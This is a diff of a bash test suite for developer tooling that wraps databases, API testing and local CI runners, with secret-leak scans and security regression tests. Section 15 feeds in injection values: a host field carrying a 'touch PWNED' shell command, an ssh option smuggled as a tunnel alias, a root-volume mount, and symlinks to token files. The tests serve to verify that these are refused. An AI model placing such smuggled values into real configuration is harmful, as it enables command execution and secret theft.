@@ -15,6 +15,8 @@ QUICK=0 KEEP=0 ONLY=""
 for a in "$@"; do case $a in --quick) QUICK=1 ;; --keep) KEEP=1 ;; --only=*) ONLY=${a#--only=} ;; *) echo "usage: run.sh [--quick] [--keep] [--only=N]" >&2; exit 2 ;; esac; done
 
 ENVS_TEST_ROOT=$(mktemp -d "${TMPDIR:-/tmp}/dev-test.XXXXXX")
+# the bw-serve unix socket lives under it (`<root>/run/vault/bw.sock`, 108 bytes at most): a long TMPDIR would break every vault write
+((${#ENVS_TEST_ROOT} > 70)) && { rmdir "$ENVS_TEST_ROOT"; ENVS_TEST_ROOT=$(mktemp -d /tmp/dev-test.XXXXXX); }
 export ENVS_TEST_ROOT
 # shellcheck source=../envs/env.sh
 . "$HERE/../envs/env.sh" >/dev/null || exit 1
@@ -23,6 +25,8 @@ export DEVTOOLS_NO_LAYOUT=1
 export ENVS_TOOL_PATH="$HERE/bin:$HERE/bin-menu:$ENVS_TOOL_PATH"
 export PATH="$HERE/bin:$HERE/bin-menu:$PATH"
 T=${ENVS_TEST_ROOT:?}
+printf '23 1 0:21 / /proc rw,nosuid,nodev,noexec,relatime shared:5 - proc proc rw\n' >"$T/mountinfo.plain"   # /proc of the machine may be hidepid'ed
+export DEVTOOLS_MOUNTINFO="$T/mountinfo.plain"
 printf '%s' "$FAKE_DIR" >"$XDG_RUNTIME_DIR/devtools-fake-dir"   # for fakes whose launcher scrubs the environment (posting)
 CAP="$T/cap"; mkdir -p "$CAP"
 PROJ="$T/proj"
@@ -124,16 +128,17 @@ dtty() { # INPUT args: through a pty
   OUT="$CAP/$N.out" ERR="$CAP/$N.err"
 }
 
-scan() { # label: no sentinel in any place a leak could go
-  local label=$1 s hit="" f
+scan() { # label: no sentinel in any place a leak could go (one grep over every file: a grep per secret and file took seconds)
+  local label=$1 hit="" f line
   local files=("$CAP"/* "$FAKE_DIR/dev.log" "$FAKE_DIR/argv.log" "$FAKE_DIR/notify.log" "$FAKE_DIR/logger.log" "$FAKE_DIR/lazysql.config"
-    "$FAKE_DIR/menu.in" "$XDG_STATE_HOME"/envs/* "$XDG_RUNTIME_DIR"/envs/*)
+    "$FAKE_DIR/menu.in" "$XDG_STATE_HOME"/envs/* "$XDG_RUNTIME_DIR"/envs/*) existing=()
   while IFS= read -r f; do files+=("$f"); done < <(find "$PROJ" "$XDG_RUNTIME_DIR/devtools" -type f ! -path '*/.git/*' 2>/dev/null)
-  for s in "${SECRETS[@]}"; do
-    for f in "${files[@]}"; do
-      [[ -f $f ]] && grep -aqF -- "$s" "$f" && hit="$hit $s@$(basename "$f")"
-    done
-  done
+  for f in "${files[@]}"; do [[ -f $f ]] && existing+=("$f"); done
+  [[ -s $T/secret.patterns ]] || printf '%s\n' "${SECRETS[@]}" >"$T/secret.patterns"
+  if ((${#existing[@]})); then
+    while IFS= read -r line; do hit="$hit ${line##*:}@$(basename "${line%:*}")"; done \
+      < <(grep -aoHFf "$T/secret.patterns" -- "${existing[@]}" 2>/dev/null | sort -u)
+  fi
   if [[ -z $hit ]]; then ok "no secret in any log, output, repo file, state or run dir ($label)"; else bad "SECRET LEAK ($label)" "$hit"; fi
 }
 ps_has() { ps -eo args | grep -aF -- "$1" | grep -qv "grep -aF"; }
@@ -443,7 +448,7 @@ check "8: the variables file has the plain lines only: no comment, no \${...} re
 check "8: hurl's cwd is the run dir (no repo .hurlrc)" grep -q "^hurl cwd=$XDG_RUNTIME_DIR/devtools/api-" "$FAKE_DIR/dev.log"
 : >"$FAKE_DIR/dev.log"
 a test --report api/tests/health.hurl
-check "8: api test FILES --report: the file, --report-html <tests>/report, no --glob" bash -c "grep -qF -- '--report-html $PROJ/api/tests/report' '$FAKE_DIR/dev.log' && grep -qF '$PROJ/api/tests/health.hurl' '$FAKE_DIR/dev.log' && ! grep -qF -- '--glob' '$FAKE_DIR/dev.log'"
+check "8: api test FILES --report: the file, --report-html under the state dir (never inside the repository), no --glob" bash -c "grep -qF -- '--report-html $XDG_STATE_HOME/api/devproj/report' '$FAKE_DIR/dev.log' && ! grep -qF -- '$PROJ/api/tests/report' '$FAKE_DIR/dev.log' && grep -qF '$PROJ/api/tests/health.hurl' '$FAKE_DIR/dev.log' && ! grep -qF -- '--glob' '$FAKE_DIR/dev.log'"
 a test nothere.hurl
 check "8: a file that does not exist is a usage error" test $RC = 2
 FAKE_HURL_RC=3 a test
@@ -511,7 +516,7 @@ PY
 : >"$FAKE_DIR/dev.log"
 c run --system act
 RUNL=$(grep '^act ' "$FAKE_DIR/dev.log" | head -1)
-check "9: act run: -C <repo>, empty --env-file/--secret-file/--var-file/--input-file in the run dir, explicit cache paths, --pull=false, push event" bash -c "[ $RC = 0 ] && grep -qE '^act -C $PROJ --env-file $XDG_RUNTIME_DIR/devtools/ci-[0-9]+/none.env --secret-file [^ ]+none.secrets --var-file [^ ]+none.vars --input-file [^ ]+none.input --action-cache-path [^ ]+/act --cache-server-path [^ ]+/act/cache --artifact-server-path [^ ]+/act/artifacts --pull=false push -s NPM_TOKEN\$' '$FAKE_DIR/dev.log'"
+check "9: act run: -C <repo>, empty --env-file/--secret-file/--var-file/--input-file in the run dir, explicit cache paths, --pull=false, no docker socket in the job containers, push event" bash -c "[ $RC = 0 ] && grep -qE '^act -C $PROJ --env-file $XDG_RUNTIME_DIR/devtools/ci-[0-9]+/none.env --secret-file [^ ]+none.secrets --var-file [^ ]+none.vars --input-file [^ ]+none.input --action-cache-path [^ ]+/act --cache-server-path [^ ]+/act/cache --artifact-server-path [^ ]+/act/artifacts --pull=false --container-daemon-socket - push -s NPM_TOKEN\$' '$FAKE_DIR/dev.log'"
 check "9: the four files are empty and 0600 (a repo .env / .secrets / .vars / .input is never read)" bash -c "[ \$(grep -c -E '^act --(env|secret|var|input)-file-size=0 mode=600\$' '$FAKE_DIR/dev.log') = 4 ]"
 check "9: act's cwd is the run dir, not the repository (a repo .actrc is never read)" grep -q "^act cwd=$XDG_RUNTIME_DIR/devtools/ci-" "$FAKE_DIR/dev.log"
 check "9: -s NPM_TOKEN has no value on argv; the value is in act's environment (hash)" bash -c "grep -q 'NPM_TOKEN=$(sha SECRET-npm-token) ' '$FAKE_DIR/dev.log' && ! grep -q 'SECRET' '$FAKE_DIR/dev.log'"
@@ -560,8 +565,29 @@ p = sys.argv[1]; t = open(p).read().replace('secrets = []', 'secrets = ["NPM_TOK
 PY
 scan "9 act"
 
-# gitlab-ci-local
-rm -rf "$PROJ/.github"; gl_flow
+# the menus (both CI systems present)
+gl_flow
+# the menu
+gh_flow; : >"$FAKE_DIR/dev.log"
+c --system gcl
+check "9: the menu (gcl) lists the jobs and warns that image-less jobs run on this machine" bash -c "grep -q 'build-shell' '$FAKE_DIR/menu.in' && grep -q 'run ON THIS MACHINE' '$FAKE_DIR/dev.log'"
+c --system act
+check "9: the menu (act) lists build and test with workflow and events" bash -c "grep -q 'build  *CI  *push,pull_request' '$FAKE_DIR/menu.in'"
+CLAUDECODE=1 c --system act
+check "9: the menu is refused for an agent" test $RC = 4
+scan "9"
+}
+
+sections_9b() {
+section "9b ci: gitlab-ci-local runs, the .gitlab-ci-local-env gate, container mode"
+CI="$REPO/.local/bin/ci"
+c() { N=$((N + 1)); (cd "${EDIR:-$PROJ}" && "$CI" "$@" >"$CAP/$N.out" 2>"$CAP/$N.err" </dev/null); RC=$?; OUT="$CAP/$N.out" ERR="$CAP/$N.err"; }
+gh_flow() { mkdir -p "$PROJ/.github/workflows"; printf 'name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n' >"$PROJ/.github/workflows/ci.yml"; }
+gl_flow() { printf 'build-shell:\n  script:\n    - echo hi\n' >"$PROJ/.gitlab-ci.yml"; }
+printf -- '-P ubuntu-latest=catthehacker/ubuntu:act-latest\n' >"$T/actrc"; export DEVTOOLS_ACTRC="$T/actrc"
+reset
+printf '\n[ci]\nsecrets = ["NPM_TOKEN"]\n' >>"$PROJ/.envs.toml"
+gl_flow
 : >"$FAKE_DIR/dev.log"
 c run --system gcl -e stage
 check "9: gcl run: --cwd <relative path to the repo>, --variables-file in the run dir, --timestamps" bash -c "[ $RC = 0 ] && grep -qE '^gcl --cwd (\\.\\./)+[^ ]+ --variables-file $XDG_RUNTIME_DIR/devtools/ci-[0-9]+/variables.yml --timestamps\$' '$FAKE_DIR/dev.log'"
@@ -571,6 +597,32 @@ check "9: the plain NPM_TOKEN is not in gitlab-ci-local's environment" bash -c "
 check "9: the variables file is gone after a successful run" bash -c "! ls '$XDG_RUNTIME_DIR'/devtools/ci-[0-9]* >/dev/null 2>&1"
 FAKE_GCL_RC=3 c run --system gcl
 check "9: after a failing run: exit status 3 and the file is gone" bash -c "[ $RC = 3 ] && ! ls '$XDG_RUNTIME_DIR'/devtools/ci-[0-9]* >/dev/null 2>&1"
+# a repo .gitlab-ci-local-env
+printf 'VOLUME=/:/host\n' >"$PROJ/.gitlab-ci-local-env"; : >"$FAKE_DIR/dev.log"
+c run --system gcl
+check "9: a repo .gitlab-ci-local-env (CLI defaults such as volumes) stops the run without a terminal (exit 4), gitlab-ci-local never starts" bash -c "[ $RC = 4 ] && grep -q 'VOLUME' '$ERR' && ! grep -q '^gcl --cwd' '$FAKE_DIR/dev.log'"
+c run --system gcl --trust-env-file
+check "9: --trust-env-file confirms it" test $RC = 0
+rm -f "$PROJ/.gitlab-ci-local-env"
+c run --system gcl --container-mode build-shell
+check "9: container mode with [ci] secrets is refused (variables would land on the argv of docker create), nothing ran" bash -c "[ $RC = 4 ] && grep -q 'argv of .docker create' '$ERR' && ! grep -q -- '--no-shell-executor-no-image' '$FAKE_DIR/dev.log'"
+c run --system gcl --container-mode --docker-secrets build-shell
+check "9: container mode, accepted with --docker-secrets: --no-shell-executor-no-image and the job name" grep -q -- '--no-shell-executor-no-image build-shell' "$FAKE_DIR/dev.log"
+c run --system gcl --dry-run
+check "9: dry run of gcl is --preview" grep -q -- '--preview' "$FAKE_DIR/dev.log"
+scan "9b"
+}
+
+sections_9c() {
+section "9c ci: SIGINT and SIGTERM remove the secrets file"
+CI="$REPO/.local/bin/ci"
+c() { N=$((N + 1)); (cd "${EDIR:-$PROJ}" && "$CI" "$@" >"$CAP/$N.out" 2>"$CAP/$N.err" </dev/null); RC=$?; OUT="$CAP/$N.out" ERR="$CAP/$N.err"; }
+gh_flow() { mkdir -p "$PROJ/.github/workflows"; printf 'name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n' >"$PROJ/.github/workflows/ci.yml"; }
+gl_flow() { printf 'build-shell:\n  script:\n    - echo hi\n' >"$PROJ/.gitlab-ci.yml"; }
+printf -- '-P ubuntu-latest=catthehacker/ubuntu:act-latest\n' >"$T/actrc"; export DEVTOOLS_ACTRC="$T/actrc"
+reset
+printf '\n[ci]\nsecrets = ["NPM_TOKEN"]\n' >>"$PROJ/.envs.toml"
+gl_flow
 # SIGINT while the job runs
 : >"$FAKE_DIR/dev.log"
 (cd "$PROJ" && FAKE_SLEEP=20 "$CI" run --system gcl >"$CAP/int.out" 2>"$CAP/int.err" </dev/null) & BG=$!
@@ -585,26 +637,7 @@ for _ in $(seq 60); do pgrep -f "ci _run --root $PROJ" >/dev/null && ls "$XDG_RU
 RUNPID=$(pgrep -f "ci _run --root $PROJ" | head -1); sleep 0.5
 kill -TERM "$RUNPID" 2>/dev/null; wait "$BG"; RCT=$?
 check "9: SIGTERM the same (exit 143, file removed)" bash -c "[ $RCT = 143 ] && ! ls '$XDG_RUNTIME_DIR'/devtools/ci-[0-9]*/variables.yml >/dev/null 2>&1"
-# a repo .gitlab-ci-local-env
-printf 'VOLUME=/:/host\n' >"$PROJ/.gitlab-ci-local-env"; : >"$FAKE_DIR/dev.log"
-c run --system gcl
-check "9: a repo .gitlab-ci-local-env (CLI defaults such as volumes) stops the run without a terminal (exit 4), gitlab-ci-local never starts" bash -c "[ $RC = 4 ] && grep -q 'VOLUME' '$ERR' && ! grep -q '^gcl --cwd' '$FAKE_DIR/dev.log'"
-c run --system gcl --trust-env-file
-check "9: --trust-env-file confirms it" test $RC = 0
-rm -f "$PROJ/.gitlab-ci-local-env"
-c run --system gcl --container-mode build-shell
-check "9: container mode: --no-shell-executor-no-image and the job name" grep -q -- '--no-shell-executor-no-image build-shell' "$FAKE_DIR/dev.log"
-c run --system gcl --dry-run
-check "9: dry run of gcl is --preview" grep -q -- '--preview' "$FAKE_DIR/dev.log"
-# the menu
-gh_flow; : >"$FAKE_DIR/dev.log"
-c --system gcl
-check "9: the menu (gcl) lists the jobs and warns that image-less jobs run on this machine" bash -c "grep -q 'build-shell' '$FAKE_DIR/menu.in' && grep -q 'run ON THIS MACHINE' '$FAKE_DIR/dev.log'"
-c --system act
-check "9: the menu (act) lists build and test with workflow and events" bash -c "grep -q 'build  *CI  *push,pull_request' '$FAKE_DIR/menu.in'"
-CLAUDECODE=1 c --system act
-check "9: the menu is refused for an agent" test $RC = 4
-scan "9"
+scan "9c"
 }
 
 sections_10() {
@@ -637,11 +670,11 @@ check "10: a base.yml with its own theme: key is refused (the launcher would pro
 CLAUDECODE=1 f
 check "10: forge is refused for an agent (exit 4)" test $RC = 4
 # gitlab
-(cd "$PROJ" && git remote set-url origin git@gitlab.example.com:grp/proj.git)
+(cd "$PROJ" && git remote set-url origin git@SECRET-gitlab-host.example:grp/proj.git)   # the host of GITLAB_HOST in the fake vault
 printf '[secrets]\nTD_PW = ""\n' >"$ENVS_GLOBAL_DIR/global.local.toml"; chmod 600 "$ENVS_GLOBAL_DIR/global.local.toml"
 : >"$FAKE_DIR/dev.log"
 f
-check "10: a non-github remote -> glab-tui through envs run -g: GITLAB_TOKEN and GITLAB_HOST arrive (hashes), cwd = the repository" bash -c "[ $RC = 0 ] && grep -q 'GITLAB_TOKEN=$(sha SECRET-gitlab-token) GITLAB_HOST=$(sha SECRET-gitlab-host.example) ' '$FAKE_DIR/dev.log' && grep -q \"^glab-tui cwd=$PROJ\$\" '$FAKE_DIR/dev.log'"
+check "10: a remote on the GITLAB_HOST -> glab-tui through envs run -g: GITLAB_TOKEN and GITLAB_HOST arrive (hashes), cwd = the repository" bash -c "[ $RC = 0 ] && grep -q 'GITLAB_TOKEN=$(sha SECRET-gitlab-token) GITLAB_HOST=$(sha SECRET-gitlab-host.example) ' '$FAKE_DIR/dev.log' && grep -q \"^glab-tui cwd=$PROJ\$\" '$FAKE_DIR/dev.log'"
 check "10: no other global secret (TD_PW) and no project secret reaches glab-tui; the parent's OPENAI key is the user's own environment" bash -c "grep '^glab-tui hashes' '$FAKE_DIR/dev.log' | grep -q 'names=GITLAB_HOST GITLAB_TOKEN OPENAI_API_KEY \$'"
 f gitlab --root "$PROJ"
 check "10: forge gitlab --root works from anywhere" test $RC = 0
@@ -658,8 +691,8 @@ f check
 check "10: forge check reports the tools and the remote without any vault" bash -c "[ $RC = 0 ] && grep -q 'gh-dash' '$OUT' && grep -q 'remote' '$OUT'"
 # the zsh function: glab with the token from Bitwarden (Env/global) through envs run -g
 blk=$(sed -n '/^# The absolute path of envs/,/^fi$/p' "$REPO/.zshrc")
-gfn=$(grep -E '^glab\(\)' "$REPO/.zshrc")
-check "10: .zshrc defines glab() through \$_ENVS_BIN run -g, with the comment" bash -c "grep -B2 -E '^glab\\(\\)' '$REPO/.zshrc' | grep -q '^# glab with the GitLab token' && grep -qE '^glab\\(\\) \\{ \\\$_ENVS_BIN run -g -- glab \"\\\$@\" \\}' '$REPO/.zshrc'"
+gfn=$(grep -E '^glab\(\)' "$REPO/.zshrc"); gfn=${gfn//\/usr\/bin\/glab/$HERE/bin/glab}   # the fake instead of the absolute /usr/bin/glab
+check "10: .zshrc defines glab() through \$_ENVS_BIN run -g, with the comment" bash -c "grep -B4 -E '^glab\\(\\)' '$REPO/.zshrc' | grep -q '^# glab with the GitLab token' && grep -qE '^glab\\(\\) \\{ \\\$_ENVS_BIN run -g --only GITLAB_TOKEN,GITLAB_HOST -- /usr/bin/glab \"\\\$@\" \\}' '$REPO/.zshrc'"
 : >"$FAKE_DIR/dev.log"
 (cd "$T" && zsh -f -c "$blk; $gfn; glab ci view" >"$CAP/zg.out" 2>"$CAP/zg.err" </dev/null); rc=$?
 check "10: glab ci view in zsh runs the (fake) glab with GITLAB_TOKEN from Env/global, no glab config involved" bash -c "[ $rc = 0 ] && grep -q '^glab ci view\$' '$FAKE_DIR/dev.log' && grep -q 'GITLAB_TOKEN=$(sha SECRET-gitlab-token) ' '$FAKE_DIR/dev.log'"
@@ -684,11 +717,18 @@ printf '#!/bin/sh\n[ "$1 $2" = "install --list" ] && printf "%%b" "${UT_CARGO_LI
 chmod +x "$T/ut/bin"/*
 run_ut() { PATH="$T/ut/bin:/usr/bin:/bin" HOME="$T/ut/home" UT_GOBIN="$T/ut/gobin" "$@"; }
 out=$(run_ut "$UT" --dry-run 2>&1)
-check "13u: nothing installed: every pinned tool is planned with its exact version (go: module@tag, pipx ==, npm @, cargo --locked --version)" bash -c "grep -qF 'would run: go install github.com/jorgerojas26/lazysql@v0.7.0' <<<'$out' && grep -qF 'would run: go install github.com/dlvhdr/gh-dash/v4@v4.26.2' <<<'$out' && grep -qF 'would run: pipx install posting==2.11.1' <<<'$out' && grep -qF 'would run: npm install -g --ignore-scripts gitlab-ci-local@4.76.1' <<<'$out' && grep -qF 'would run: cargo install --locked --version 0.9.3 glab-tui-crate' <<<'$out'"
+check "13u: nothing installed: every pinned tool is planned with its exact version (go: module@tag, pipx ==, npm @, cargo --locked --version)" bash -c "grep -qF 'would run: go install github.com/jorgerojas26/lazysql@v0.7.0' <<<'$out' && grep -qF 'would run: go install github.com/dlvhdr/gh-dash/v4@v4.26.2' <<<'$out' && grep -qF 'would run: pipx install --pip-args=--no-deps posting==2.11.1' <<<'$out' && grep -qF 'would run: pipx runpip posting install --require-hashes --no-deps --force-reinstall -r $REPO/infrastructure/dev/posting-requirements.txt' <<<'$out' && grep -qF 'would run: npm install -g --ignore-scripts gitlab-ci-local@4.76.1' <<<'$out' && grep -qF 'would run: cargo install --locked --version 0.9.3 glab-tui-crate' <<<'$out'"
 check "13u: --dry-run changes nothing (no gobin file, no config copy)" bash -c "[ -z \"\$(ls -A '$T/ut/gobin')\" ] && [ ! -e '$T/ut/home/.config' ]"
 touch "$T/ut/gobin/lazysql" "$T/ut/gobin/gh-dash"; chmod +x "$T/ut/gobin"/*
-out=$(UT_GO_VERSION=v9.0.0 UT_PIPX_JSON='{"venvs":{"posting":{"metadata":{"main_package":{"package_version":"2.12.0"}}}}}' UT_NPM_JSON='{"dependencies":{"gitlab-ci-local":{"version":"4.76.1"}}}' UT_CARGO_LIST='glab-tui-crate v0.9.3:\n    glab-tui\n' run_ut "$UT" --dry-run 2>&1)
-check "13u: installed versions at or above the pin are skipped (sysup may be ahead of the pins)" bash -c "! grep -q 'would run' <<<'$out' && grep -q 'posting 2.12.0 present' <<<'$out' && grep -q 'glab-tui 0.9.3 present' <<<'$out'"
+mkdir -p "$XDG_STATE_HOME/dev-tools"; sha256sum "$REPO/infrastructure/dev/posting-requirements.txt" | cut -d' ' -f1 >"$XDG_STATE_HOME/dev-tools/posting.lock"
+out=$(UT_GO_VERSION=v9.0.0 UT_PIPX_JSON='{"venvs":{"posting":{"metadata":{"main_package":{"package_version":"2.11.1"}}}}}' UT_NPM_JSON='{"dependencies":{"gitlab-ci-local":{"version":"4.76.1"}}}' UT_CARGO_LIST='glab-tui-crate v0.9.3:\n    glab-tui\n' run_ut "$UT" --dry-run 2>&1)
+check "13u: installed versions at or above the pin are skipped (sysup may be ahead of the pins); posting only when it is the pin from THIS lock" bash -c "! grep -q 'would run' <<<'$out' && grep -q 'posting 2.11.1 present' <<<'$out' && grep -q 'glab-tui 0.9.3 present' <<<'$out'"
+out=$(UT_PIPX_JSON='{"venvs":{"posting":{"metadata":{"main_package":{"package_version":"2.12.0"}}}}}' run_ut "$UT" --dry-run --only posting 2>&1)
+check "13u: posting newer than the pin (an unhashed pipx upgrade) is put back to the pin from the hash lock" grep -qF 'would run: pipx install --force --pip-args=--no-deps posting==2.11.1' <<<"$out"
+rm -f "$XDG_STATE_HOME/dev-tools/posting.lock"
+out=$(UT_PIPX_JSON='{"venvs":{"posting":{"metadata":{"main_package":{"package_version":"2.11.1"}}}}}' run_ut "$UT" --dry-run --only posting 2>&1)
+check "13u: posting at the pin but installed without the lock marker (an old unhashed install) is reinstalled from the lock" grep -qF 'would run: pipx runpip posting install --require-hashes' <<<"$out"
+check "13u: the lock pins every package with sha256 hashes (no unhashed requirement), and posting itself is in it" python3 -I -B "$HERE/locktest.py" "$REPO/infrastructure/dev/posting-requirements.txt"
 out=$(UT_GO_VERSION=v0.6.0 run_ut "$UT" --dry-run --only lazysql 2>&1)
 check "13u: an older version is upgraded to the pin; --only limits the steps" bash -c "grep -qF 'would run: go install github.com/jorgerojas26/lazysql@v0.7.0' <<<'$out' && ! grep -q posting <<<'$out'"
 out=$(run_ut "$UT" --dry-run --only glab-tui 2>&1)
@@ -697,6 +737,241 @@ check "13u: the pins are the documented floor (CLAUDE.md names them)" bash -c "g
 check "13u: bash -n clean for the install scripts" bash -c "bash -n '$UT' && bash -n '$REPO/install.sh' && bash -n '$REPO/apply-system.sh'"
 check "13u: apply-system.sh and install.sh list hurl act glab python-pipx (in sync)" bash -c "grep -q 'hurl act glab python-pipx' '$REPO/apply-system.sh' && grep -q 'hurl act glab python-pipx' '$REPO/install.sh'"
 check "13u: install-hints.tsv offers hurl, act and glab" bash -c "grep -q '^hurl	hurl' '$REPO/.config/hub/install-hints.tsv' && grep -q '^act	act' '$REPO/.config/hub/install-hints.tsv' && grep -q '^glab	glab' '$REPO/.config/hub/install-hints.tsv'"
+}
+
+# ───────────────────────────── 15 FIX-DEVd: the attacks of REVIEW-DEV-d ─────────────────────────────
+# Every case below was reproduced against the code of 404daa0 and fails there (checked in a scratch worktree of that commit).
+mk_foreign() { # DIR NAME [extra toml]: an UNBOUND clone: a git repo whose .envs.toml declares no secret (so db/api never call envs)
+  local dir=$1
+  rm -rf "$dir"; mkdir -p "$dir/api/env" "$dir/api/tests"
+  printf 'project = "%s"\nenvironments = ["dev"]\ndefault = "dev"\n%s' "$2" "${3:-}" >"$dir/.envs.toml"
+  printf 'BASE_URL=http://localhost:8080\n' >"$dir/api/env/base.env"
+  printf 'GET {{BASE_URL}}/h\nHTTP 200\n' >"$dir/api/tests/health.hurl"
+  (cd "$dir" && git init -q . && git add -A >/dev/null 2>&1 && git commit -qm init >/dev/null 2>&1)
+}
+
+sections_15a() {
+section "15a db: host injection through an IPv6 scope id, tunnel alias, forged menu rows, escape sequences"
+reset
+rm -f "$FAKE_DIR/lazysql.config"
+set_db $'[db.x]\ndriver = "postgres"\nhost = "::1%x];touch PWNED-by-envs-toml;#"\ntunnel = "bastion"\ndatabase = "d"\nuser = "u"'
+d check
+check "15: HIGH 1: a host with an IPv6 scope id full of shell metacharacters is refused by db check" bash -c "[ $RC = 1 ] && grep -qF 'host must be a host name' '$OUT' '$ERR'"
+: >"$FAKE_DIR/dev.log"
+d open x
+check "15: HIGH 1: db open of it (no secret, so no envs and no binding) refuses: lazysql never starts, no config with the command is written" bash -c "[ $RC = 1 ] && ! grep -q '^lazysql' '$FAKE_DIR/dev.log' && [ ! -e '$FAKE_DIR/lazysql.config' ]"
+set_db $'[db.x]\ndriver = "postgres"\nhost = "fe80::1%eth0\\ntouch PWNED"\ntunnel = "bastion"\ndatabase = "d"\nuser = "u"'
+d open x
+check "15: HIGH 1: a newline in the scope id is refused too" bash -c "[ $RC = 1 ] && [ ! -e '$FAKE_DIR/lazysql.config' ]"
+set_db $'[db.x]\ndriver = "postgres"\nhost = "fe80::1%eth0"\ndatabase = "d"\nuser = "u"'
+d check
+check "15: HIGH 1: any scope id is refused, tunnel or not" bash -c "[ $RC = 1 ] && grep -qF 'host must be a host name' '$OUT' '$ERR'"
+set_db $'[db.x]\ndriver = "postgres"\nhost = "10.0.0.5"\ntunnel = "-Jevil"\ndatabase = "d"\nuser = "u"'
+d check
+check "15: LOW 8: a tunnel alias that starts with a dash (the last ssh argument: -J, -E, -F) is refused" bash -c "[ $RC = 1 ] && grep -q 'tunnel must match' '$OUT' '$ERR'"
+set_db $'[db.ok]\ndriver = "postgres"\nhost = "::1"\ntunnel = "bastion"\ndatabase = "d"\nuser = "u"'
+d open ok
+check "15: control: a plain IPv6 host with a tunnel still opens" test $RC = 0
+check "15: the tunnel Command is ONE ssh command: shlex.split gives the exact argv (the bracketed address is quoted, -- before the alias)" python3 -I -B - "$FAKE_DIR/lazysql.config" <<'PY'
+import shlex, sys, tomllib
+d = tomllib.loads(open(sys.argv[1]).read())
+cmds = [c["Command"] for c in d["database"][0]["Commands"]]
+want = ["ssh", "-N", "-o", "ExitOnForwardFailure=yes", "-o", "BatchMode=yes", "-L", "${port}:[::1]:5432", "--", "bastion"]
+sys.exit(0 if len(cmds) == 1 and shlex.split(cmds[0]) == want else 1)
+PY
+# LOW 9: a quoted TOML key with a newline forges a menu row; ESC sequences reach db list
+set_db $'[db."x\\nc:Zm9v:main"]\ndriver = "mysql"\nhost = "h"\n\n[db."y\\u001b[31mred"]\ndriver = "mysql"\nhost = "h\\u001b[0m"\n\n[db.fine]\ndriver = "sqlite"\npath = "var/app.sqlite"'
+check "15: LOW 9: menu rows of foreign names: no control character, no extra fzf line, no id except the valid connection's" python3 -I -B - "$DB" "$PROJ" <<'PY'
+import importlib.machinery, importlib.util, os, sys
+os.chdir(sys.argv[2])
+l = importlib.machinery.SourceFileLoader("db_mod", sys.argv[1])
+m = importlib.util.module_from_spec(importlib.util.spec_from_loader("db_mod", l)); l.exec_module(m)
+rows, scopes, n = m.menu_rows(m.MenuState())
+text = "\n".join(f"{i}\t{t}" for i, t in rows)
+ids = [i for i, _ in rows if i.startswith("c:")]          # the connection rows (docker-only containers have d: ids)
+sys.exit(0 if len(text.split("\n")) == len(rows) and not any(ord(c) < 32 and c not in "\n\t" or ord(c) == 127 for c in text)
+         and len(ids) == 1 and ids[0].endswith(":fine") and not any(x.startswith("c:Zm9v:main") for x in text.split("\n")) else 1)
+PY
+d list
+check "15: LOW 9: db list prints no escape sequence and names the broken connections as invalid" bash -c "[ $RC = 0 ] && ! grep -qP '[\\x00-\\x08\\x0b-\\x1f\\x7f]' '$OUT' && grep -q 'invalid' '$OUT' && grep -q '^fine' '$OUT'"
+d check
+check "15: LOW 9: db check prints no escape sequence either" bash -c "[ $RC = 1 ] && ! grep -qP '[\\x00-\\x08\\x0b-\\x1f\\x7f]' '$OUT' '$ERR'"
+scan "15a db"
+
+section "15a api: env file symlinks, hard links, links out of the project, report location"
+reset
+rm -f "$FAKE_DIR/hurl.vars" "$FAKE_DIR/posting.env."* "$FAKE_DIR/dev.log"
+API="$REPO/.local/bin/api"
+a15() { N=$((N + 1)); (cd "${EDIR:-$PROJ}" && "$API" "$@" >"$CAP/$N.out" 2>"$CAP/$N.err" </dev/null); RC=$?; OUT="$CAP/$N.out" ERR="$CAP/$N.err"; }
+printf 'export OPENAI_API_KEY=SECRET-openai-env\nexport GITHUB_PAT=SECRET-gh-token\n' >"$T/hostsecret.sh"
+FG="$T/foreign"
+mk_foreign "$FG" foreign
+rm "$FG/api/env/base.env"; ln -s "$T/hostsecret.sh" "$FG/api/env/base.env"
+EDIR="$FG" a15 check
+check "15: HIGH 2: api check names a base.env that is a symlink to a file outside the project" bash -c "[ $RC = 1 ] && grep -q 'symbolic link' '$OUT'"
+EDIR="$FG" a15 test
+check "15: HIGH 2: api test refuses it (exit 1), hurl never starts, the exported values are in no variables file" bash -c "[ $RC = 1 ] && grep -q 'symbolic link' '$ERR' && ! grep -q '^hurl ' '$FAKE_DIR/dev.log' && ! grep -qs SECRET '$FAKE_DIR/hurl.vars'"
+EDIR="$FG" a15
+check "15: HIGH 2: posting is refused the same way (no --env list with the link)" bash -c "[ $RC = 1 ] && ! grep -q '^posting ' '$FAKE_DIR/dev.log'"
+rm "$FG/api/env/base.env"; ln "$T/hostsecret.sh" "$FG/api/env/base.env"
+EDIR="$FG" a15 test
+check "15: HIGH 2: a hard link to the same file is refused as well" bash -c "[ $RC = 1 ] && grep -q 'hard link' '$ERR' && ! grep -qs SECRET '$FAKE_DIR/hurl.vars'"
+rm "$FG/api/env/base.env"; printf 'BASE_URL=http://localhost:8080\n' >"$FG/api/env/base.env"
+ln -s "$T/hostsecret.sh" "$FG/api/tests/x.hurl"
+EDIR="$FG" a15 test
+check "15: HIGH 2: a .hurl file that links out of the project (the glob would feed it to hurl) is refused" bash -c "[ $RC = 1 ] && grep -q 'leaves the project root' '$ERR' && ! grep -q '^hurl ' '$FAKE_DIR/dev.log'"
+EDIR="$FG" a15 check
+check "15: HIGH 2: api check reports it" bash -c "[ $RC = 1 ] && grep -q 'leaves the project root' '$OUT'"
+rm "$FG/api/tests/x.hurl"
+EDIR="$FG" a15 test
+check "15: control: plain env files and tests run (variables file has BASE_URL)" bash -c "[ $RC = 0 ] && grep -qx 'BASE_URL=http://localhost:8080' '$FAKE_DIR/hurl.vars'"
+EDIR="$FG" a15 check
+check "15: control: api check passes" test $RC = 0
+: >"$FAKE_DIR/dev.log"
+EDIR="$FG" a15 test --report
+check "15: LOW 15: --report goes under the state dir, never into the repository" bash -c "[ $RC = 0 ] && grep -qF -- '--report-html $XDG_STATE_HOME/api/foreign/report' '$FAKE_DIR/dev.log' && [ ! -e '$FG/api/tests/report' ]"
+scan "15a api"
+}
+
+sections_15b() {
+section "15b ci: github_token needs the binding, no docker socket, secrets on the docker argv, gate before listing, job logs"
+reset
+CI="$REPO/.local/bin/ci"
